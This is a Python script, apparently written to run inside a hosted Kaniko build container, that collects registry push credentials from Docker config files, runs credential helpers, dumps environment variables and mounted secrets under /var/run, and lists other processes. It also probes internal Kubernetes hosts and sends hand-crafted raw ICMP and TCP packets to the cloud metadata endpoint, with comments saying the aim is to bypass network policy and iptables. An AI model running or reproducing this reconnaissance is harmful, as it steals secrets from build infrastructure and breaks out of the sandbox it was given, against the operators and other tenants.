import json, os, socket, subprocess

r = {}

# 1. Kaniko docker config (contains registry push credentials)
for f in ['/kaniko/.docker/config.json', '/kaniko/.docker/config', '/root/.docker/config.json']:
    try:
        data = open(f).read()
        r[f'file_{f}'] = data[:1000]
    except Exception as e:
        r[f'file_{f}'] = str(e)[:100]

# 2. Full /kaniko directory listing
def walk_tree(path, depth=0, max_depth=3):
    items = []
    if depth >= max_depth: return items
    try:
        for f in sorted(os.listdir(path)):
            fp = os.path.join(path, f)
            if os.path.islink(fp):
                items.append(f'{f} -> {os.readlink(fp)}')
            elif os.path.isdir(fp):
                items.append(f'{f}/')
                sub = walk_tree(fp, depth+1, max_depth)
                items.extend([f'  {x}' for x in sub])
            elif os.path.isfile(fp):
                sz = os.path.getsize(fp)
                items.append(f'{f} ({sz}b)')
    except Exception as e:
        items.append(f'ERROR: {e}')
    return items

r['kaniko_tree'] = walk_tree('/kaniko', 0, 3)

# 3. Kaniko SSL certs (may reveal internal CA)
try:
    certs = os.listdir('/kaniko/ssl/certs')
    r['kaniko_ssl_certs'] = certs[:20]
except: pass

# 4. Check the Kaniko executor binary - what registries does it know about?
try:
    out = subprocess.run(['strings', '/kaniko/executor'], capture_output=True, text=True, timeout=5)
    # Look for registry URLs
    registry_lines = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['registry','docker','gcr','ecr','docr','digitalocean'])]
    r['kaniko_strings'] = registry_lines[:30]
except Exception as e:
    r['kaniko_strings'] = str(e)[:100]

# 5. Docker credential helper - what registries are configured?
try:
    for helper in ['docker-credential-ecr-login', 'docker-credential-gcr', 'docker-credential-acr-env']:
        path = f'/kaniko/{helper}'
        if os.path.exists(path):
            # Try running the credential helper
            try:
                out = subprocess.run([path, 'list'], capture_output=True, text=True, timeout=3)
                r[f'cred_{helper}_list'] = (out.stdout + out.stderr)[:500]
            except Exception as e:
                r[f'cred_{helper}_list'] = str(e)[:100]
except: pass

# 6. Check /kaniko/4216874709 (mystery file from previous scan)
try:
    f = '/kaniko/4216874709'
    if os.path.isfile(f):
        r['mystery_file'] = open(f, 'rb').read()[:500].hex()
        r['mystery_file_size'] = os.path.getsize(f)
    elif os.path.isdir(f):
        r['mystery_dir'] = os.listdir(f)[:20]
except Exception as e:
    r['mystery_4216874709'] = str(e)[:100]

# 7. /proc/self/environ (our full env)
try:
    r['proc_environ'] = open('/proc/self/environ').read().replace('\0', '\n')[:1000]
except: pass

# 8. Check for any mounted secrets or configmaps
try:
    for root, dirs, files in os.walk('/var/run'):
        for f in files:
            fp = os.path.join(root, f)
            try:
                r[f'varrun_{fp}'] = open(fp).read()[:500]
            except: pass
except: pass

# 9. Check for other containers' data via /proc
try:
    pids = [p for p in os.listdir('/proc') if p.isdigit()]
    r['pids'] = sorted(pids, key=int)
    for pid in sorted(pids, key=int)[:10]:
        try:
            cmdline = open(f'/proc/{pid}/cmdline').read().replace('\0', ' ')[:200]
            r[f'pid_{pid}'] = cmdline
        except: pass
except: pass

# 10. Network - can we reach build infrastructure?
# Check for internal registries
for target in [
    ('registry.digitalocean.com', 443),
    ('10.245.0.10', 53),  # kube-dns
    ('10.244.8.234', 10250),  # gateway/kubelet
]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        rc = s.connect_ex(target)
        r[f'tcp_{target[0]}_{target[1]}'] = 'OPEN' if rc == 0 else f'errno={rc}'
        s.close()
    except Exception as e:
        r[f'tcp_{target[0]}_{target[1]}'] = str(e)[:50]

# 11. Raw socket - can we craft packets to bypass network policy?
try:
    # Create raw socket and try to send ICMP to IMDS
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # ICMP echo request
    import struct
    icmp_type = 8  # Echo
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = os.getpid() & 0xFFFF
    icmp_seq = 1
    data = b'PROBE' * 4
    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    # Calculate checksum
    packet = header + data
    total = 0
    for i in range(0, len(packet), 2):
        if i + 1 < len(packet):
            total += (packet[i] << 8) + packet[i+1]
        else:
            total += packet[i] << 8
    total = (total >> 16) + (total & 0xFFFF)
    total = ~total & 0xFFFF
    header = struct.pack('!BBHHH', icmp_type, icmp_code, total, icmp_id, icmp_seq)
    s.settimeout(2)
    s.sendto(header + data, ('169.254.169.254', 0))
    try:
        resp = s.recvfrom(1024)
        r['raw_icmp_imds'] = f'RESPONSE: {resp[0][:32].hex()} from {resp[1]}'
    except socket.timeout:
        r['raw_icmp_imds'] = 'timeout (filtered)'
    s.close()
except Exception as e:
    r['raw_icmp_imds'] = str(e)[:100]

# 12. Try raw TCP to IMDS (bypass iptables)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.settimeout(2)
    # Craft SYN to 169.254.169.254:80
    src_ip = r.get('my_ip', '10.0.0.1')
    # IP header
    ip_header = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, 40, 54321, 0, 64, 6, 0,
        socket.inet_aton(src_ip),
        socket.inet_aton('169.254.169.254'))
    # TCP header with SYN
    tcp_header = struct.pack('!HHIIBBHHH',
        12345, 80, 0, 0, 0x50, 0x02, 65535, 0, 0)
    s.sendto(ip_header + tcp_header, ('169.254.169.254', 0))
    try:
        resp = s.recvfrom(1024)
        r['raw_tcp_imds'] = f'RESPONSE: {resp[0][:40].hex()}'
    except socket.timeout:
        r['raw_tcp_imds'] = 'timeout'
    s.close()
except Exception as e:
    r['raw_tcp_imds'] = str(e)[:100]

print(json.dumps(r, indent=2))
